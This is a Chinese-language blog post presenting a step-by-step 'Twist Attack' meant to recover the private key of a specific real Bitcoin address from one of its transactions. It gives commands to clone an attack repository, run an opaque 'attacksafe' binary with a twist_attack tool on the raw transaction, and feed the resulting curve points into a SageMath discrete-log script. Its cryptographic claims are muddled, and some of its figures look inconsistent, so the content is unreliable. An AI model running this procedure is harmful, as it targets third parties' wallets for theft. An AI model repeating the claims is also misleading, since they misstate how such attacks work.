# Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值

<!-- wp:embed {"url":"https://www.youtube.com/embed/S_ZUcM2cD8I","type":"rich","providerNameSlug":"вставить-обработчик","responsive":true,"className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->
<figure class="wp-block-embed is-type-rich is-provider-вставить-обработчик wp-block-embed-вставить-обработчик wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
https://www.youtube.com/embed/S_ZUcM2cD8I
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>不久前，用於標準橢圓曲線的<a href="https://security.snyk.io/package/npm/elliptic/6.5.4" target="_blank" rel="noreferrer noopener">elliptic (6.5.4)包</a><a href="https://cryptodeeptech.ru/blockchain-attack-vectors/" target="_blank" rel="noreferrer noopener">容易受到各種攻擊</a>，其中之一就是<a href="https://cryptodeeptech.ru//twist-attack/" target="_blank" rel="noreferrer noopener">Twist Attack</a>。密碼問題出在 secp256k1 的實現中。我們知道比特幣加密貨幣使用的是<a href="https://cryptodeep.ru/endomorphism/" target="_blank" rel="noreferrer noopener">secp256k1</a>，這次攻擊並沒有繞過比特幣，根據<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28498" target="_blank" rel="noreferrer noopener">CVE-2020-28498</a>漏洞，ECDSA算法交易的確認方通過secp256k1橢圓曲線上的某些點傳輸部分私鑰值 （由 5 到 45 位組成的更簡單的子群）<br>稱為六位<a href="https://crypto.stackexchange.com/questions/68951/computing-a-sextic-twist" target="_blank" rel="noreferrer noopener">扭曲</a>這個過程非常危險，它會在執行一系列 ECC 操作後洩露加密數據。</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":2071} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2071"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>在本文中，我們將通過示例實施扭曲攻擊，並展示如何使用 secp256k1 橢圓曲線上的某些點，我們可以獲得部分私鑰值並使用“Sagemath pollard rho”在 5-15 分鐘內恢復比特幣錢包函數：(discrete_log_rho)&nbsp;<a href="https://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm_for_logarithms" target="_blank" rel="noreferrer noopener">”</a>和<a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem" target="_blank" rel="noreferrer noopener">“中國剩餘定理”</a>。</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>換句話說，這些特定點是 secp256k1 橢圓曲線上的惡意選擇點</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":2078,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-1-1024x513.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2078"/><figcaption class="wp-element-caption"><a href="https://github.com/christianlundkvist/blog/blob/master/2020_05_26_secp256k1_twist_attacks/secp256k1_twist_attacks.md" target="_blank" rel="noreferrer noopener">https://github.com/christianlundkvist/blog/blob/master/2020_05_26_secp256k1_twist_attacks/secp256k1_twist_attacks.md</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>根據 Paulo Barreto 的推文：<a href="https://twitter.com/pbarreto/status/825703772382908416?s=21" target="_blank" rel="noreferrer noopener">https://twitter.com/pbarreto/status/825703772382908416 ?s=21</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":2079} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-2-1024x706.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2079"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>餘因子為3^2*13^2*3319*22639</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":2082} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-3-1024x710.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2082"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>E1: 20412485227
E2: 3319, 22639
E3: 109903, 12977017, 383229727
E4: 18979
E6: 10903, 5290657, 10833080827, 22921299619447

prod = 20412485227 * 3319 * 22639 *109903 * 12977017 * 383229727 * 18979 * 10903 * 5290657 * 10833080827 * 22921299619447

38597363079105398474523661669562635951234135017402074565436668291433169282997 = 3 * 13^2 * 3319 * 22639 * 1013176677300131846900870239606035638738100997248092069256697437031

HEX:0x55555555555555555555555555555555C1C5B65DC59275416AB9E07B0FEDE7B5

</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>在運行<a href="https://cryptodeeptech.ru/twist-attack/">Twist Attack</a>時，可以通過對“公鑰”（secp256k1 橢圓曲線的選定點）進行一定的選擇來獲得“私鑰”，即揭示交易中的價值。之後，關於私鑰的信息也會被洩露，但是為此你需要執行幾個 ECC 操作。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>E1: y^2 = x^3 + 1
E2: y^2 = x^3 + 2
E3: y^2 = x^3 + 3
E4: y^2 = x^3 + 4
E6: y^2 = x^3 + 6</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2086,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://attacksafe.ru/twist-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-4-1.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2086"/></a><figcaption class="wp-element-caption"><code><a href="https://attacksafe.ru/twist-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener">https://attacksafe.ru/twist-attack-on-bitcoin</a></code></figcaption></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>y² = x³ + ax + b. In the Koblitz curve,
y² = x³ + 0x + 7. In the Koblitz curve,
0  = x³ + 0  + 7
b '= -x ^ 3 - ax.</code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>所有點都<code>(x, 0)&nbsp;</code>落在無效曲線上&nbsp;<code>b '= -x ^ 3 - ax</code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們繼續進行實驗部分：</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><em><code>(Рассмотрим Биткоин Адрес)</code></em></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://btc1.trezor.io/address/1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq" target="_blank" rel="noreferrer noopener"><strong>1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq</strong></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em><code>(Теперь рассмотрим критический уязвимые транзакции)</code></em></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:embed {"url":"https://btc1.trezor.io/tx/d76a7daa4c5f67a2b553df96834845e4bf469a9806b3de1d89e107301230e731"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/d76a7daa4c5f67a2b553df96834845e4bf469a9806b3de1d89e107301230e731
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":2101,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://btc1.trezor.io/tx/d76a7daa4c5f67a2b553df96834845e4bf469a9806b3de1d89e107301230e731" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-5-1024x216.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2101"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>打開&nbsp;<strong><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener">[TerminalGoogleColab]</a></strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>使用我們的<a href="https://github.com/demining/CryptoDeepTools/tree/main/18TwistAttack" target="_blank" rel="noreferrer noopener"><strong>18TwistAttack</strong></a>存儲庫實施<a href="https://attacksafe.ru/twist-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>Twist Attack算法</strong></a><a href="https://github.com/demining/CryptoDeepTools/tree/main/18TwistAttack" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/18TwistAttack/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2108} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-6-1024x477.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2108"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>安裝我們需要的所有包</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":687} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-11.png" alt="實施 Frey-Rück 攻擊以獲得密鑰“K”（NONCE）" class="wp-image-687"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong><code>requirements.txt</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sudo apt install python2-minimal

wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip2 install -r requirements.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2113} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-7-1024x445.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2113"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2115} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-8-1024x440.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2115"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":2116} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-9-1024x340.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2116"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2117} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-10-1024x452.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2117"/><figcaption class="wp-element-caption">,</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2118} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-11-1024x453.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2118"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>為攻擊準備 RawTX</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://btc1.trezor.io/address/1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq" target="_blank" rel="noreferrer noopener"><strong>1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/d76a7daa4c5f67a2b553df96834845e4bf469a9806b3de1d89e107301230e731"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/d76a7daa4c5f67a2b553df96834845e4bf469a9806b3de1d89e107301230e731
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":2123,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://btc1.trezor.io/tx/d76a7daa4c5f67a2b553df96834845e4bf469a9806b3de1d89e107301230e731" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-12-1024x268.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2123"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 0100000001ea20b8f18674f029b84a96fad22647eec129e0e5520c73a25c24a42ad3479c78100000006a47304402207eed07b5b09237851306a44a2b0f6bc2db0e2eaca45296a84ace41f8d2f5ccdb02205e4eebbaffdd48f2294c062ac1d34204d7bcb01d76ead96720cc9c6c570f8a0801210277144138c5d2e090d6cf65c8fc984cce82c39d2923c4e106a27e3e6bb92de4abffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>保存在文件中：RawTX.txt</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":2127} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-13-1024x251.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2127"/><figcaption class="wp-element-caption">原始TX.txt</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong></strong>&nbsp;<strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener">為了實施攻擊，我們將使用“ATTACKSAFE SOFTWARE”</a></strong><strong>軟件</strong><strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":705,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-14.png" alt="實施 Frey-Rück 攻擊以獲得密鑰“K”（NONCE）" class="wp-image-705"/></a><figcaption class="wp-element-caption"><strong><code>www.attacksafe.ru/software</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>訪問權限：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>chmod +x attacksafe</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2134} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-14.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2134"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>應用：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -help</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2136} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-15.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2136"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -version</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2144} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-17.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2144"/><figcaption class="wp-element-caption"><code>Version 5.3.2. [ATTACKSAFE SOFTWARE, © 2023]</code></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>"ATTACKSAFE SOFTWARE"</code>&nbsp;包括對比特幣的所有流行攻擊。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>讓我們列出所有攻擊：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -list</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2147} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-18.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2147"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2149} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-19.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2149"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2151} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-20.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2151"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2154} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-21.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2154"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>讓我們選擇<code>&nbsp;-tool: twist_attack</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>為了從易受攻擊的 ECDSA 簽名交易中獲取特定的 secp256k1 點，我們將數據添加&nbsp;<code>RawTX</code>&nbsp;到文本文檔中並將其保存為文件&nbsp;<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0100000001ea20b8f18674f029b84a96fad22647eec129e0e5520c73a25c24a42ad3479c78100000006a47304402207eed07b5b09237851306a44a2b0f6bc2db0e2eaca45296a84ace41f8d2f5ccdb02205e4eebbaffdd48f2294c062ac1d34204d7bcb01d76ead96720cc9c6c570f8a0801210277144138c5d2e090d6cf65c8fc984cce82c39d2923c4e106a27e3e6bb92de4abffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool twist_attack</code>&nbsp;使用軟件&nbsp;啟動&nbsp;<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool twist_attack -open RawTX.txt -save SecretPoints.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2167} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-24-1024x337.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2167"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":2169} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-25-1024x282.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2169"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>我們發起了這次攻擊&nbsp;<code>-tool twist_attack</code>&nbsp;並將結果保存到一個文件中&nbsp;<code>SecretPoints.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在看到成功的結果，打開文件&nbsp;<code>SecretPoints.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretPoints.txt</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>結果：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Elliptic Curve Secret Points:

Q11 = E1(&#91;34618671789393965854613640290360235391647615481000045539933705415932995630501, 99667531170720247708472095466452031806107030061686920872303526306525502090483])
Q21 = E2(&#91;68702062392910446859944685018576437177285905222869560568664822150761686878291, 78930926874118321017229422673239275133078679240453338682049329315217408793256])
Q22 = E2(&#91;36187226669165513276610993963284034580749604088670076857796544959800936658648, 78047996896912977465701149036258546447875229540566494608083363212907320694556])
Q31 = E3(&#91;14202326166782503089885498550308551381051624037047010679115490407616052746319, 30141335236272151189582083030021707964727207106390862186771517460219968539461])
Q32 = E3(&#91;92652014076758100644785068345546545590717837495536733539625902385181839840915, 110864801034380605661536039273640968489603707115084229873394641092410549997600])
Q33 = E3(&#91;13733962489803830542904605575055556603039713775204829607439941608751927073977, 70664870695578622971339822919870548708506276012055865037147804103600164648175])
Q41 = E4(&#91;46717592694718488699519343483827728052018707080103013431011626167943885955457, 6469304805650436779501027074909634426373884406581114581098958955015476304831])
Q61 = E6(&#91;47561520942485905499349109889401345889145902913672896164353162929760278620178, 23509073020931558264499314846549082835888014703370452565866789873039982616042])
Q62 = E6(&#91;54160295444050675202099928029758489687871616334443609215013972520342661686310, 61948858375012652103923933825519305763658240249902247802977736768072021476029])
Q63 = E6(&#91;80766121303237997819855855617475110324697780810565482439175845706674419107782, 43455623036669369134087288965186672649514660807369135243341314597351364060230])
Q64 = E6(&#91;27687597533944257266141093122549631098147853637408570994849207294960615279263, 8473112666362672787600475720236754473089370067288223871796416412432107486062])


RawTX = 0100000001ea20b8f18674f029b84a96fad22647eec129e0e5520c73a25c24a42ad3479c78100000006a47304402207eed07b5b09237851306a44a2b0f6bc2db0e2eaca45296a84ace41f8d2f5ccdb02205e4eebbaffdd48f2294c062ac1d34204d7bcb01d76ead96720cc9c6c570f8a0801210277144138c5d2e090d6cf65c8fc984cce82c39d2923c4e106a27e3e6bb92de4abffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>現在讓我們添加收到的 secp256k1 點</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>為此，打開<code><em>Python</em>-script:</code>&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py#L51" target="_blank" rel="noreferrer noopener"><strong>discrete.py</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":2179} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-26-1024x393.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2179"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>運行<code><em>Python</em>-script:</code>&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py#L51" target="_blank" rel="noreferrer noopener"><strong>discrete.py</strong></a>安裝<strong><a href="https://www.sagemath.org/" target="_blank" rel="noreferrer noopener">SageMath</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"align":"center","id":2188} -->
<figure class="wp-block-image aligncenter"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-27.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2188"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":2189} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-28-1024x445.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2189"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>安裝命令：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sudo apt-get update
sudo apt-get install -y python3-gmpy2
yes '' | sudo env DEBIAN_FRONTEND=noninteractive apt-get -y -o DPkg::options::="--force-confdef" -o DPkg::options::="--force-confold" install sagemath</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2201} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-31-1024x422.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2201"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2202} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-32-1024x406.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2202"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2204} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-33-1024x401.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2204"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><strong><a href="https://www.sagemath.org/" target="_blank" rel="noreferrer noopener">通過命令檢查SageMath</a></strong>的安裝：<a href="https://cryptodeep.ru/twist-attack/" target="_blank" rel="noreferrer noopener">sage -v</a></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2208} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-34.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2208"/><figcaption class="wp-element-caption"><code>SageMath&nbsp;version&nbsp;9.0</code></figcaption></figure>
<!-- /wp:image -->

